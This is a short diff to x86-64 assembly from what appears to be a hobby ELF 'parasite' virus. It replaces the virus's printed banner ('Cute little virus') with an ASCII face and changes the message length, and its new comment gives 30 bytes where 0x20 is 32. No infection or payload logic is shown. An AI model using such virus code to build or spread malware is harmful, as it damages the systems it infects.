@@ -49,7 +49,7 @@ _start:
 	push r12
 	
 	jmp	parasite
-	message:	db	"-x-x-x-x- COMPILEPEACE : Cute little virus ^_^ -x-x-x-x-", 0xa
+	message:	db	"-x-x-x-x- \_<O>_<O>_/ -x-x-x-x-", 0xa
 	filepath:   db  "/proc/self/maps", 0x0          ; 16 bytes
 
 
@@ -62,7 +62,7 @@ parasite:
 	lea rsi, [rel message]			; Addresses the label relative to RIP (Instruction Pointer), i.e. 
 									; dynamically identifying the address of the 'message' label.
 	xor rdx, rdx
-	mov dl, 0x39					; message size = 57 bytes (0x39)
+	mov dl, 0x20					; message size = 30 bytes
 	syscall					
 
 
